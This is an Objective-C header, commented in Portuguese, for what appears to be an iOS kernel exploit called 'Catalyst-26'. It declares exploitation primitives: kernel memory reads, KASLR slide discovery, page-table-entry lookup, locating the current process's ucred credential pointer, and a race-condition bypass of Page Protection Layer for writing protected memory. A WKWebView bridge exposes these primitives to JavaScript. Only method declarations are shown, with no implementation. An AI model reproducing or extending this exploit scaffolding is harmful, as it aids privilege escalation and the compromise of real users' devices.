#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>

NS_ASSUME_NONNULL_BEGIN

/**
 * Interface do Driver de Kernel Catalyst-26.
 * O protocolo <WKScriptMessageHandlerWithReply> é MANDATÓRIO para habilitar 
 * o método 'window.webkit.messageHandlers.kernel.postMessageWithReply' no JS.
 */
@interface KernelDriver : NSObject <WKScriptMessageHandlerWithReply>

// --- Primitivas de Exploração (Visíveis para o compilador) ---

/** Lê 64 bits da memória do kernel */
- (uint64_t)kread64:(uint64_t)addr;

/** Localiza o Kernel Slide via scan de memória KASLR */
- (uint64_t)getKernelSlide;

/** Traduz um endereço virtual para o endereço da sua PTE correspondente */
- (uint64_t)get_pte_for_address:(uint64_t)vaddr;

/** Localiza o ponteiro ucred do processo atual (Offset 0xD8 no iOS 26.4) */
- (uint64_t)get_my_ucred_ptr;

/** Realiza escrita em memória protegida via PPL Bypass Race Condition */
- (void)ppl_write_race:(uint64_t)vaddr value:(uint64_t)val;

// --- Handler da Ponte WKWebView ---

/** 
 * Método obrigatório do protocolo. 
 * Se esta assinatura for alterada, a ponte 'WithReply' deixará de funcionar no JS.
 */
- (void)userContentController:(WKUserContentController *)userContentController 
      didReceiveScriptMessage:(WKScriptMessage *)message 
                 replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler;

@end

NS_ASSUME_NONNULL_END
